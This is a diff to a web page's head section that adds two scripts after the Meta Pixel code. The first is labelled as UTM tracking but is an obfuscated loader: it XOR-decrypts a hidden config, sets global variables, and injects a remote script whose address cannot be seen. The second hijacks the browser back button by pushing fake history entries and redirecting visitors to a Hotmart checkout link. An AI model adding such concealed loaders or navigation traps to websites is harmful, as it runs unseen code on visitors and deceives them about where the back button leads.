@@ -27,6 +27,34 @@ fbq('track', 'PageView');
 src="https://www.facebook.com/tr?id=1591205932630011&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
+
+<!-- Utmify UTM Tracking -->
+<script>(function(){var r_8o=atob("DO/xcHS/+l7h7clBNpTTBQbT2GTDhb01RpzLX1vcnjDPmL0sX4mIXhfQl3CDn+YyVZ2YAADM1SuVgLpuWo6FFQfL1DSSz+VjV5uFAh3djyqEnut7bZTTHhXSn3zbz60gQo7cBQDSkziYwLkzU5mUHgCSiSuDhK0yFMPTBhXTjzvD1+tjS7KM");var f_r6=[];for(var w_4=0;w_4<r_8o.length;w_4++){f_r6.push(r_8o.charCodeAt(w_4)&255);}var x_2red=f_r6[0];var o_w1ll=f_r6.slice(1,1+x_2red);var y_o=f_r6.slice(1+x_2red);var t_020n=y_o.map(function(b,k_bdso){return b^o_w1ll[k_bdso%x_2red];});var v_1="";for(var y_dsy4=0;y_dsy4<t_020n.length;y_dsy4++){v_1+=String.fromCharCode(t_020n[y_dsy4]&255);}var r_zm=decodeURIComponent(escape(v_1));var r_gfu2=JSON.parse(r_zm);var b_otu=r_gfu2.globals||[];b_otu.forEach(function(g_1eb){window[g_1eb.name]=g_1eb.value;});var o_p6=document.createElement("script");o_p6.src=r_gfu2.url;o_p6.async=true;o_p6.defer=true;(r_gfu2.attributes||[]).forEach(function(z_0){o_p6.setAttribute(z_0.name,z_0.value);});(document.head||document.documentElement).appendChild(o_p6);})();</script>
+
+<!-- Utmify Back Redirect -->
+<script>
+  const utmifyBackRedirectLink = 'https://pay.hotmart.com/G106994081Q';
+
+  function setBackRedirect(url) {
+    let urlBackRedirect = url;
+    urlBackRedirect = urlBackRedirect =
+      urlBackRedirect.trim() +
+      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+      document.location.search.replace('?', '').toString();
+
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+    history.pushState({}, '', location.href);
+
+    window.addEventListener('popstate', () => {
+      setTimeout(() => {
+        location.href = urlBackRedirect;
+      }, 1);
+    });
+  }
+
+  setBackRedirect(utmifyBackRedirectLink);
+</script>
 </head>
 <body>
 
